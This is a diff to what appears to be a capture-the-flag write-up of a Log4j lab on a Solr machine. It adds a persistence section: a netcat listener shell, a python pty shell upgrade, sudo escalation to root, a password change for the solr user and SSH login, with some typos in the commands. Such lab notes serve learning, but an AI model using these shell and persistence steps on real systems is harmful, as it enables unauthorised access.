@@ -81,7 +81,34 @@ nc -lvnp 9999
 we get access
 
 <img width="964" height="178" alt="image" src="https://github.com/user-attachments/assets/7ab59db3-70fa-47f7-b5b8-44b2a80e38a0" />
-#
+
+# PERSISTENCE
+
+To better understand this log4j vulnerability, 
+
+>let's grant ourselves "better access" so we can explore the machine
+
+>Analyze the affected logs
+
+>And even mitigate the vulnerability!
+1.WHOAMI
+
+Answer:solr
+
+NOTE:Here everthing is lokking same command and answer so
+
+*python3 -c "import pty; pty.spawn('/bin/bash')"*
+
+# sudo -l -Check super user permissions. For your convenience in this exercise, your user should have sudo privileges without the need for any password.
+
+Now access into the machine via SSH, momentarily become root and change the password for the solr user to one of your choosing.
+
+.sudo bash
+.passwd eleven
+.renter thr passwd eleven
+
+exit from the netcat
+**ssh solor@mahcineip**
 
 
 
